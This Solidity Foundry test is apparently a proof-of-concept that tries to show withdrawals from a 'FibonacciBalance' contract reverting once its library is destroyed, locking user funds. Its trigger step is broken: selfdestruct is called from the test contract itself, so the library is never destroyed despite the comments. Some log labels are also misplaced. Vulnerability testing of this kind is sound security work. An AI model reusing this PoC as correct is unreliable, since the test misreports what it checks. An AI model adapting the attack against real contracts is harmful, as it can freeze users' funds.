// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/FibonacciBalance.sol";

contract FibonacciBalanceTest is Test {
    FibonacciBalance fibBalance;
    FibonacciLib fibLib;
    
    address user = address(0x123);
    uint256 initialDeposit = 1 ether;

    function setUp() public {
        // Deploy required contracts
        fibLib = new FibonacciLib();
        fibBalance = new FibonacciBalance{value: initialDeposit}(address(fibLib));
        
        // Make test user deposit funds
        vm.deal(user, initialDeposit);
        vm.prank(user);
        fibBalance.deposit{value: initialDeposit}();
    }

    function testWithdrawVulnerability() public {
        // Before destruction state
        console2.log("--- BEFORE-Trigger: Library Destruction ---");
        uint256 preDestructionCounter = fibBalance.withdrawalCounter();
        console2.log("Initial withdrawal counter:", preDestructionCounter);
        console2.log("Contract balance before destruction:", address(fibBalance).balance);
        
        // Destroy the library
        console2.log("--- Trigger: Destroy FibonacciLib ---");
        vm.prank(address(fibLib));
        selfdestruct(payable(user));
        
        // After destruction state
        console2.log("--- BEFORE-Trigger: Withdrawal Attempt ---");
        uint256 userBalanceBefore = user.balance;
        uint256 contractBalanceBefore = address(fibBalance).balance;
        uint256 counterBefore = fibBalance.withdrawalCounter();
        console2.log("User balance before withdrawal:", userBalanceBefore);
        console2.log("Contract balance before withdrawal:", contractBalanceBefore);
        console2.log("Withdrawal counter before:", counterBefore);
        
        // Attempt withdrawal - should revert
        console2.log("--- Trigger: Withdrawal Attempt ---");
        vm.prank(user);
        vm.expectRevert();
        fibBalance.withdraw();
        
        // After attempt state
        console2.log("--- AFTER-Trigger: Withdrawal Attempt ---");
        uint256 userBalanceAfter = user.balance;
        uint256 contractBalanceAfter = address(fibBalance).balance;
        uint256 counterAfter = fibBalance.withdrawalCounter();
        console2.log("User balance after withdrawal:", userBalanceAfter);
        console2.log("Contract balance after withdrawal:", contractBalanceAfter);
        console2.log("Withdrawal counter after:", counterAfter);
        
        // Verify no state changes occurred
        bool noBalanceChange = (userBalanceAfter == userBalanceBefore) && 
                               (contractBalanceAfter == contractBalanceBefore);
        bool counterUnchanged = (counterAfter == counterBefore);
        
        if (noBalanceChange && counterUnchanged) {
            console2.log("Vulnerability Exists: Withdrawal reverted after library destruction");
        } else {
            console2.log("Vulnerability not Exist: Withdrawal succeeded or state changed unexpectedly");
        }
    }
}